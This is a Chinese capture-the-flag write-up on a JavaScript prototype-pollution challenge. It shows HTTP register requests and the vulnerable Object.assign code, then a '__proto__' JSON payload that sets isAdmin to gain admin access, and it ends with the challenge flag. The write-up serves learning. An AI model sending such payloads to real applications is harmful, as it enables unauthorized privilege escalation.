# wife_wife

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=e5ba95f8-884a-11ed-ab28-000c29bc20bf&task_category_id=3)

网站可以登录可以注册，除此之外没别的了。随便注册个用户登录也只能得到假flag。注册界面抓个包，包的格式如下：

```
POST /register HTTP/1.1
Host: 61.147.171.105:49801
Content-Length: 47
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://61.147.171.105:49801
Referer: http://61.147.171.105:49801/register.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"username":"b","password":"b","isAdmin":false}
```

直接把false改成true重发是没用的。毫无思路，查了[wp](https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#wife%F0%9F%92%83)才觉经验还是不足。这题就是个普通的原型链污染，只不过题目是黑盒，需要自己测试。看wp里给的关键部分源码就能发现问题了：

```js
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body)
    if (!user.username || !user.password) {
        return res.json({ msg: 'empty username or password', err: true })
    }
    if (users.filter(u => u.username == user.username).length) {
        return res.json({ msg: 'username already exists', err: true })
    }
    if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
        return res.json({ msg: 'invalid invite code', err: true })
    }
    let newUser = Object.assign({}, baseUser, user) //就是这里，原型链污染
    users.push(newUser)
    res.json({ msg: 'user created successfully', err: false })
})
```

查阅资料，原来[Object.assign](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign)也能触发原型链污染。`let newUser = Object.assign({}, baseUser, user)`的作用是把baseUser和user的属性合并后拷贝到`{}`中，即newUser是baseUser和user的集合体。baseUser猜测是user类似父类的东西，user应该就是上面的`{"username":"b","password":"b","isAdmin":false}`部分了。直接bp发包：

```
POST /register HTTP/1.1
Host: 61.147.171.105:49801
Content-Length: 62
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://61.147.171.105:49801
Referer: http://61.147.171.105:49801/register.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"username":"e","password":"e","__proto__":{"isAdmin":true}}
```

然后登录注册的用户即可得到flag。内部发生了类似下面的情况：

```js
let baseUser={};
let data='{"username":"e","password":"e","__proto__":{"isAdmin":true}}';
let user= JSON.parse(data);
console.log(user);
console.log(user.isAdmin); //这里输出的是undefined，故不会进入下面的if语句强制将user.isAdmin设为false
let INVITE_CODE="whatever";
if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
}
let newUser = Object.assign({}, baseUser, user) //触发原型链污染
console.log(newUser.isAdmin);
```

看了这篇[文章](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)相信这道题就很简单了。原型链污染不太准确的理解就是“父类影响子类”，一个子类继承于父类后，父类有什么属性子类就有什么属性。比如这里我们的注册信息data按照json的形式传入，JSON.parse后得到一个对象。这个对象有3个键名，username，password和__proto__。比较容易搞混的地方来了，这个__proto__是键名，单纯是个键名，值为{"isAdmin":true}，而不是类的原型对象prototype。这点很重要，如果我们把测试代码稍微修改一下：

```js
let baseUser={};
//let data='{"username":"e","password":"e","__proto__":{"isAdmin":true}}';
//let user= JSON.parse(data);
let user={"username":"e","password":"e","__proto__":{"isAdmin":true}};
console.log(user);
console.log(user.isAdmin); //输出true，导致进入下面的if语句将isAdmin强行改为false
let INVITE_CODE="whatever";
if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
}
let newUser = Object.assign({}, baseUser, user) //那这里的原型链污染也没用了，子类后定义的属性值会覆盖父类的
console.log(newUser.isAdmin);
```

这里的user直接就是个类，“\_\_proto\_\_“不是键名，而是类的原型对象prototype。这样就会有两个问题，第一，当`console.log(user.isAdmin);`尝试读取isAdmin属性时会顺着上去找父类的，得到true，进入if语句强制赋值全部白给；第二，\_\_proto\_\_不是键名，后面Object.assign不会拷贝到newUser上。总之就是记住，原型链污染需要在JSON解析的情况下进行。

最后`Object.assign({}, baseUser, user)`把user的键全部拷贝给newUser。现在newUser就有isAdmin属性了，还是true，自然就能拿到flag了。

## Flag
> CatCTF{test_flag_h0w_c@n_I_l1ve_w1th0ut_nilou}